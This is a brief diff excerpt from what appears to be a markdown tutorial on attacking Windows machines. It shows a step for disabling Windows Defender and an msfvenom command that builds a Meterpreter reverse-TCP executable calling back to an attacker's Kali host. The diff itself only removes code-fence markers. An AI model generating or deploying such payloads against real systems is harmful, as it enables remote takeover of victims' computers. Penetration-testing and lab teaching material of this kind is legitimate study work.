@@ -23,10 +23,10 @@ Disable Windows Defender:
 ```
 
 ### Step 2: Generate Malicious Payload
-```
+
 **Command**: 
 sudo msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<kali_ip> lport=4444 -f exe -o any_name.exe
 
-```
+
 
 
